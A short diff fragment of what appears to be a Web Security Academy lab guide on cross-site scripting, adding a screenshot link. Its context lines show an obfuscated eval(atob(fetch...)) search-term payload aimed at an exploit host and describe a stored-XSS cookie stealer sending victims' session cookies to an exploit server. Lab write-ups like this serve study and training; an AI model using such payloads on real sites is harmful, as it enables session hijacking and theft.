@@ -310,6 +310,8 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
 <video src="https://EXPLOIT.net/video"></video>
 ```  
   
+![Identify-stored-xss](images/identify-stored-xss.png)  
+
 >Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
 
 ```html
